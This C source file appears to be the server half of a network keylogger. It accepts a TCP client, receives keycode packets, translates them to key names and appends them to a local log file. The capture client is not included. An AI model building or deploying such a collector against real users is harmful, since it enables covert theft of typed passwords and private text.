#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include "protocol.h"

const char* translate_key(int keycode) {
    static const char *key_map[128] = {
        [0] = "<RES>", [1] = "<ESC>", [2] = "1", [3] = "2", [4] = "3", 
        [5] = "4", [6] = "5", [7] = "6", [8] = "7", [9] = "8", 
        [10] = "9", [11] = "0", [12] = "-", [13] = "=", [14] = "<BACKSPACE>", 
        [15] = "<TAB>", [16] = "q", [17] = "w", [18] = "e", [19] = "r", 
        [20] = "t", [21] = "y", [22] = "u", [23] = "i", [24] = "o", 
        [25] = "p", [26] = "[", [27] = "]", [28] = "\n", [29] = "<LCTRL>",
        [30] = "a", [31] = "s", [32] = "d", [33] = "f", [34] = "g",
        [35] = "h", [36] = "j", [37] = "k", [38] = "l", [39] = ";",
        [40] = "'", [41] = "`", [42] = "<LSHIFT>", [43] = "\\", [44] = "z", 
        [45] = "x", [46] = "c", [47] = "v", [48] = "b", [49] = "n", 
        [50] = "m", [51] = ",", [52] = ".", [53] = "/", [54] = "<RSHIFT>", 
        [55] = "<KPASTERISK>", [56] = "<LALT>", [57] = " ", [58] = "<CAPSLOCK>", [59] = "<F1>", 
        [60] = "<F2>", [61] = "<F3>", [62] = "<F4>", [63] = "<F5>", [64] = "<F6>", 
        [65] = "<F7>", [66] = "<F8>", [67] = "<F9>", [68] = "<F10>", [69] = "<NUMLOCK>", 
        [70] = "<SCROLLLOCK>", [71] = "<KP7>", [72] = "<KP8>", [73] = "<KP9>", [74] = "<KPMINUS>", 
        [75] = "<KP4>", [76] = "<KP5>", [77] = "<KP6>", [78] = "<KPPLUS>", [79] = "<KP1>", 
        [80] = "<KP2>", [81] = "<KP3>", [82] = "<KP0>", [83] = "<KPDOT>", [84] = "<ZENKAKU>", 
        [85] = "<102ND>", [86] = "<F11>", [87] = "<F12>", [88] = "<RO>", [89] = "<KATAKANA>", 
        [90] = "<HIRAGANA>", [91] = "<HENKAN>", [92] = "<KATAKANAHIRAGANA>", [93] = "<MUHENKAN>", [94] = "<KPJPCOMMA>", 
        [95] = "<KPENTER>", [96] = "<RCTRL>", [97] = "<KPSLASH>", [98] = "<SYSRQ>", [99] = "<RALT>", 
        [100] = "<LINEFEED>", [101] = "<HOME>", [102] = "<UP>", [103] = "<PAGEUP>", [104] = "<LEFT>", 
        [105] = "<RIGHT>", [106] = "<END>", [107] = "<DOWN>", [108] = "<PAGEDOWN>", [109] = "<INSERT>", 
        [110] = "<DELETE>", [111] = "<MACRO>", [112] = "<MUTE>", [113] = "<VOLUMEDOWN>", [114] = "<VOLUMEUP>", 
        [115] = "<POWER>", [116] = "<KPEQUAL>", [117] = "<KPPLUSMINUS>", [118] = "<PAUSE>", [119] = "<SCALE>", 
        [120] = "<KPCOMMA>", [121] = "<HANGEUL>", [122] = "<HANJA>", [123] = "<YEN>", [124] = "<LMETA>", 
        [125] = "<RMETA>", [126] = "<COMPOSE>", [127] = "<STOP>"
    };

    if (keycode >= 0 && keycode < 128) {
        if (key_map[keycode] != NULL) {
            return key_map[keycode];
        }
    }
    
    return "<UNK>"; 
}

void write_to_file(KeyPackage *package){
    const char *translated_char = translate_key(package->key_code);
    FILE *file;
    file = fopen("log-client.txt", "a");
    if(file == NULL){
        fopen("log-client.txt", "w");
    }

    if(file == NULL){
        perror("failed to open log .txt file");
        exit(EXIT_FAILURE);
    }

    fprintf(file, "%s", translated_char);
    fclose(file);
}

int main(){
    // cria o ponto de comunicação inicial, devolve um file descriptor
    int server_socketFd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    must_init("socket() failed - error creating socket fd", server_socketFd);

    struct sockaddr_in server_sockAddr;

    memset(&server_sockAddr, 0, sizeof(server_sockAddr));

    server_sockAddr.sin_family = PF_INET; // IPv4
    server_sockAddr.sin_port = htons(SERVER_PORT); // define a porta
    server_sockAddr.sin_addr.s_addr = htonl(INADDR_ANY); // servidor vai aceitar conexões de qualquer interface
    
    // passamos a struct para bindar o socket a uma porta
    must_init("bind() failed - error binding socket to a port", bind(server_socketFd, (struct sockaddr*)&server_sockAddr, sizeof(server_sockAddr)));

    // informa ao OS que este socket será passivo, também define um backlog que é o tamanho da fila de espera
    must_init("listen() failed - error defining socket specifications", listen(server_socketFd, BACKLOG));

    struct sockaddr_in client_sockAddr;
    socklen_t client_addrLen = sizeof(client_sockAddr);

    printf("waiting for client accept\n");

    // bloqueia a execução até um cliente se conectar, então cria e devolve um novo file descriptor
    // é por esse file descriptor que a comunicação vai acontecer, o outro file descriptor fica livre
    // para receber novas conexões (o que não vai acontecer aqui pq o servidor atual é single-threaded e blocking)
    int client_socketFd = accept(server_socketFd, (struct sockaddr *)&client_sockAddr, &client_addrLen);
    must_init("accept() failed - error creating client fd", client_socketFd);

    printf("client connected\n");

    // struct que armazena os dados que chegam na rede
    KeyPackage received_package;

    while(true){
        // recv() é bloqueante, o servidor espera aqui até receber dados
        ssize_t rbytes = recv(client_socketFd, &received_package, sizeof(KeyPackage), 0);

        if(rbytes < 0){ 
            perror("recv() failed - error receiving data"); 
            break; 
        }
    
        if(rbytes == 0){ 
            printf("connection with client was gracefully closed\n"); 
            break; 
        }

        write_to_file(&received_package);
        //const char *tchar = translate_key(received_package.key_code);
        //printf("%s", tchar);
        //fflush(stdout);
        //printf("key code: %d | status: %d\n", received_package.key_code, received_package.is_pressed);
    }

    close(client_socketFd);
    printf("client socket closed\n");
    close(server_socketFd);
    printf("server socket closed\n");
    printf("connection terminated\n");
}